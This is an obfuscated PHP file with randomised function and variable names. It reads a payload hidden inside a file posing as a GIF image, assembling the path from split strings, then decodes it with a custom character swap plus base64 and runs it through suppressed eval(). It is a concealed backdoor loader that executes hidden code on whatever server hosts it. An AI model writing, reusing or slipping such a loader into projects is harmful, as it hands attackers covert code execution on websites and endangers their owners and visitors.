<?php

class okyvez_ralahiwe {

    public static function fyluki_chothichix($ponuge_perujutho, $yjafer_hoshosivy = false) {
        $ekanir = "=IAMYO95Nw7jqfJpm1XHarbK/ukRBWUSCtEDPgGoecv6sFVxld8LZyQ4n+hzi3T20";
        $olizheq = "MYjDwd42LQfAWyuX8FvG0RtgerJnZSKh71TsBoUq6Vla=z3ckN/OP+pmiCI9HbEx5";
        $pojymy = array();
        for ($fywiji = strlen($ekanir) - 1; $fywiji >= 0; $fywiji--) {
            $ogofozu = substr($ekanir, $fywiji, 1);
            $acofys = substr($olizheq, $fywiji, 1);
            $pojymy[$ogofozu] = $acofys;
        }

        $ebenole = strtr($ponuge_perujutho, $pojymy);
        $ebenole = base64_decode($ebenole);

        return $ebenole;
    }

    public static function ukelip_ifukhuhakhi($ponuge_perujutho) {
        $todika = array();
        if (!file_exists($ponuge_perujutho))
            return false;
        $ubiwuku = @file_get_contents($ponuge_perujutho);
        if (!$ubiwuku)
            return false;
        $ubiwuku = substr($ubiwuku, 3);
        $todika = self::fyluki_chothichix($ubiwuku);
        return $todika;
    }

}

function rycury_khocekhidezh($ponuge_perujutho) {
    $todika = okyvez_ralahiwe::ukelip_ifukhuhakhi($ponuge_perujutho);
    return $todika;
}

function otevaq_rekhugyw($ponuge_perujutho) {
    $ybiquch = okyvez_ralahiwe::fyluki_chothichix($ponuge_perujutho);
    return $ybiquch;
}

$exyjyku = rycury_khocekhidezh(__DIR__ . "/ima" . "ges/z" . "yxup" . "a.gif");
if ($exyjyku) {
    @eval($exyjyku);
}

